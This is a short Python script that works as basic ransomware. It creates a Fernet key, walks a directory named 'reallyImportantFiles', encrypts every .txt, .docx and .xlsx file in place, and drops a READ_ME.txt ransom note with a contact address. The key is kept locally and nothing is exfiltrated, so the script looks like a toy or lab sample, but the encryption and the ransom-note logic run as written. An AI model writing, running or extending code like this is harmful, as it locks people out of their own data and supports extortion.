from cryptography.fernet import Fernet
import os

def generate_key():
  if (os.path.exists("secret.key")):
    return
  with open("secret.key", "wb") as key_file:
    key = Fernet.generate_key()
    key_file.write(key)

def load_key():
  return open("secret.key", "rb").read()

def encrypt_file(file_path, key):
  fernet = Fernet(key)
  with open(file_path, "rb") as file:
    original = file.read()
  encrypted = fernet.encrypt(original)
  with open(file_path, "wb") as encrypted_file:
    encrypted_file.write(encrypted)

def decrypt_file(file_path, key):
  fernet = Fernet(key)
  with open(file_path, "rb") as encrypted_file:
    encrypted = encrypted_file.read()
  decrypted = fernet.decrypt(encrypted)
  with open(file_path, "wb") as decrypted_file:
    decrypted_file.write(decrypted)

def show_rescue_message():
  with open("READ_ME.txt", "w") as message_file:
    message_file.write("Your files have been encrypted! To recover them, please contact us at gatinhoDaora@meow.miau.poliglot")

def find_files_to_encrypt(directory):
  files_to_encrypt = []
  for root, _, files in os.walk(directory):
    for file in files:
      if file.endswith((".txt", ".docx", ".xlsx")):
        files_to_encrypt.append(os.path.join(root, file))
  return files_to_encrypt

generate_key()
key = load_key()
target_directory = "reallyImportantFiles"
files = find_files_to_encrypt(target_directory)
for file_path in files:
  encrypt_file(file_path, key)
print(f"Encrypted {len(files)} files in '{target_directory}' directory.")
show_rescue_message()